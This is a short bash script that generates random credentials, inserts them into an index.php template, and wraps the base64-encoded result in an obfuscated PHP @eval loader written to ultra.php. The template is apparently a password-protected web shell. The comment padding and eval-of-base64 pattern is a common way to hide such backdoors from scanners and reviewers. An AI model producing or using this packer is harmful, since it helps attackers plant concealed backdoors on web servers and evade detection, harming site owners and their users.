#!/bin/bash
username=$(echo $RANDOM | md5sum | head -c 20; echo;)
password=$(echo $RANDOM | md5sum | head -c 20; echo;)
sed "s|####USERNAME####|${username}|g" index.php > index2.php
sed "s|####PASSWORD####|${password}|g" index2.php > index3.php
username_text="This is the username: ${username}"
password_text="This is the password: ${password}"
echo ${username_text}
echo ${password_text}
echo ${username_text} > credentials.txt
echo ${password_text} >> credentials.txt
base64string=$(base64 --w 0 < index3.php)
echo "<?php /****/@null; /********/ /********/ /********/@eval/****/(\"?>\".base64_decode(\"${base64string}\")); ?>" > ultra.php
